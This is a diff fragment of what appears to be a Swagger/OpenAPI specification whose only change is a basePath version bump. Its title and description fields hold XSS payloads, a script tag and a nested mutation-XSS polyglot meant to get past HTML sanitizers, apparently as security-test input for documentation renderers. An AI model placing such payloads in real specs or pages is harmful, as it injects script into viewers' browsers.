@@ -3,7 +3,7 @@ info:
   title: PenTesting<script>alert(1)</script>
   description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script>alert(1)</script>">
   version: production
-basePath: /JSSResource4/
+basePath: /JSSResource5/
 produces:
   - application/xml
   - application/json
